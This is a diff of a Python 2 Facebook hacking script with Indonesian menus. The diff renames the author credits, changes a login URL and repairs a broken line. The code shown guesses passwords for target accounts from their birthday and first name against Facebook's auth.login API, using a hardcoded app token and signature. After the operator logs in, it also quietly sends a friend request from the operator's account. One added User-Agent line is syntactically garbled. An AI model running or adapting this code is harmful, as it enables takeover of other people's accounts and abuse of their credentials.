@@ -25,7 +25,7 @@ sys.setdefaultencoding('utf8')
 br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
-br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36; U; id) Presto/2.12.423 Version/12.16')]
+br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36; U; id) Presto/2.12.423 Version/12.16')]-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
 
 #-Keluar-#
 def keluar():
@@ -61,12 +61,12 @@ logo = """\033[1;93m█████████
 \033[1;93m█▄█████▄█      \033[1;91m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
 \033[1;93m█\033[1;92m▼▼▼▼▼ \033[1;92m- _ --_--\033[1;95m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ 
 \033[1;93m█ \033[1;92m \033[1;92m_-_-- -_ --__\033[1;93m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗
-\033[1;93m█\033[1;92m▲▲▲▲▲\033[1;92m--  - _ --\033[1;96m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ \033[1;96mIAhmed CYBER 
+\033[1;93m█\033[1;92m▲▲▲▲▲\033[1;92m--  - _ --\033[1;96m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ \033[1;96mILMAN CYBER 
 \033[1;93m█████████      \033[1;92m«----------✧----------»
 \033[1;93m ██ ██
 \033[1;93m╔════════════════════════════════════════════╗
-\033[1;93m║\033[1;96m* \033[1;93mAuthor  \033[1;93m: \033[1;93mILMAN•|Alzwage CYBER 404 \033[1;93m       ║
-\033[1;93m║\033[1;96m* \033[1;93mGitHub  \033[1;93m: \033[1;93m\033[4mMasi Ahmedalzwage \033[0m \033[1;93m      ║
+\033[1;93m║\033[1;96m* \033[1;93mAuthor  \033[1;93m: \033[1;93mILMAN•|Mr.BUM1 CYBER 404 \033[1;93m       ║
+\033[1;93m║\033[1;96m* \033[1;93mGitHub  \033[1;93m: \033[1;93m\033[4mMasi Rahasia Script Nya😑\033[0m \033[1;93m      ║
 \033[1;93m╚════════════════════════════════════════════╝"""
 
 # titik #
@@ -109,7 +109,7 @@ def lisensi():
 def masuk():
 	os.system('reset')
 	print logo
-	print "\033[1;91m║--\033[1;91m> \033[1;95m1.\033[1;96m Login by email"
+	print "\033[1;91m║--\033[1;91m> \033[1;95m1.\033[1;96m Login dulu"
 	print "\033[1;92m║--\033[1;91m> \033[1;95m2.\033[1;96m Login using token"
 	print "\033[1;93m║--\033[1;91m> \033[1;95m0.\033[1;96m Exit/keluar"
 	print "\033[1;95m║"
@@ -142,7 +142,7 @@ def login():
 		pwd = getpass.getpass('\033[1;95m[+] \033[1;93mPassword \033[1;93m:\033[1;95m ')
 		tik()
 		try:
-			br.open('https://mbasic.facebook.com')
+			br.open('https://m.facebook.com')
 		except mechanize.URLError:
 			print"\n\033[1;91m[!] No connection"
 			keluar()
@@ -168,7 +168,7 @@ def login():
 				zedd.close()
 				print '\n\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mLogin successfully'
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				os.system('xdg-open https://m.facebook.com/ahmedalzwage.01')
+				os.system('xdg-open https://m.facebook.com/ilman.gaming.52')
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;91m[!] No connection"
@@ -1064,7 +1064,7 @@ def mini():
 								menu_hack()
 							else:
 								lahir = a['birthday']
-								pz4 = lahir.replace('/','. '')
+								pz4 = lahir.replace('/', '')
 								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 								y = json.load(data)
 								if 'access_token' in y:
@@ -1085,7 +1085,7 @@ def mini():
 										menu_hack()
 									else:
 										lahirs = a['birthday']
-										gaz = lahirs.replace('/','. '')
+										gaz = lahirs.replace('/', '')
 										pz5 = a['first_name']+gaz
 										data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 										y = json.load(data)
